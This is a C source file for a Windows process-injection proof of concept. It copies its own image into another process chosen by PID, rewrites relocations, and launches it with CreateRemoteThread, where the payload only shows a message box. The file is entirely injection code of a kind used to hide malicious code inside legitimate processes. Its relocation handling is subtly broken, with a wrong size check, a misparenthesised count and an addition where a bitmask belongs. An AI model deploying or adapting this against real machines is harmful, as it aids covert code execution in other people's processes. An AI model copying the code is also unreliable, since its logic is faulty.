#include<stdio.h>
#include<windows.h>
DWORD injectentry()
{
    char modulefilename[MAX_PATH];
    GetModuleFileName(NULL,modulefilename,sizeof(modulefilename));
    MessageBoxA(NULL,modulefilename,"PE INJECT",MB_OK);
    return 0;
}

int main(int argc,char *argv[])
{

    if(argc!=2)
    {
        printf("[*] USAGE : program.exe PID_NUMBER");
        return 1;
    }

    //get the handle on process you need to inject

        HANDLE hproc;
        hproc=OpenProcess(PROCESS_ALL_ACCESS,FALSE,atoi(argv[1]));
        if(!hproc)
        {
            printf("[*] CANT OPEN PROCESS DUE TO %d",GetLastError());
            return 1;
        }
    //get the image base of current process

    PVOID imagebase=GetModuleHandle(NULL);
    if(!imagebase)
    {
        printf("Couldnt get the image base of current process due to %d",GetLastError());
        return 1;
    }
    else
    {
        printf("the image base address is %#x\n",imagebase);
    }

    //GET THE SIZE FROM PE HEADERS
    PIMAGE_DOS_HEADER pidh=(PIMAGE_DOS_HEADER)imagebase;
    PIMAGE_NT_HEADERS pinh=(PIMAGE_NT_HEADERS)((PUCHAR)imagebase+pidh->e_lfanew);

    //ALLOCATE MEMORY IN TARGET PROCESS

    PVOID allocmemtarget=VirtualAllocEx(hproc,NULL,pinh->OptionalHeader.SizeOfImage,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
    if(!allocmemtarget)
    {
        printf("[*] MEMORY COULDNT BE ALLOCATED IN TARGET PROCESS DUE TO %d\n",GetLastError());
        return 1;
    }
    printf("MEMORY ALLOCATED AT %#x\n",allocmemtarget);
    //ALLOCATE MEMORY IN CURRENT PROCESS
    PVOID buffer=VirtualAlloc(NULL,pinh->OptionalHeader.SizeOfImage,MEM_COMMIT | MEM_RESERVE,PAGE_READWRITE);
    if(!buffer)
    {
        printf("[*] MEMORY COULDNT BE ALLOCATED IN CURRENT PROCESS DUE TO %d\n",GetLastError());
    }
    //copy the image base in the current process
    memcpy(buffer,imagebase,pinh->OptionalHeader.SizeOfImage);

    //CALUCLATE THE IMAGE BASE RELOCATION
    PIMAGE_BASE_RELOCATION baserloc=(PIMAGE_BASE_RELOCATION)((PUCHAR)buffer+pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    if(!baserloc)
    {
        printf("[*] COULDNT GET BASE RELOCATION\n");
        return 1;
    }

    ULONG64 delta=(ULONG64)allocmemtarget-(ULONG64)imagebase;
    printf("[*] THE DELTA IS %#x\n",delta);

    ULONG64 Count=0,i=0,*p=NULL;

    PUSHORT offset;

    while(baserloc->VirtualAddress)
    {
        if(baserloc->SizeOfBlock==sizeof(IMAGE_BASE_RELOCATION))
        {
            Count=(baserloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)/sizeof(USHORT));
            offset=(PUSHORT)baserloc + 1;
            for(i=0;i<Count;i++)
            {
                if(offset[i])
                {
                    p=(PULONG64)((PUCHAR)buffer+baserloc->VirtualAddress+(offset[i] + 0x0FFF));
                    *p+=delta;
                }
            }

        }
    baserloc=(PIMAGE_BASE_RELOCATION)((PUCHAR)baserloc+baserloc->SizeOfBlock);



    }

    BOOL memwrite=WriteProcessMemory(hproc,allocmemtarget,buffer,pinh->OptionalHeader.SizeOfImage,NULL);
    if(!memwrite)
    {
        printf("[*]COULDN'T WRITE MEMORY IN TARGET PROCESS %d\n",GetLastError());
        return 1;
    }

    HANDLE CRthread=CreateRemoteThread(hproc,NULL,0,(LPTHREAD_START_ROUTINE)((PUCHAR)injectentry+delta),NULL,0,NULL);
    if(!CRthread)
    {
        printf("[*]THREAD COULDNT BE STARTED DUE TO %d\n",GetLastError());
        return 1;
    }




}
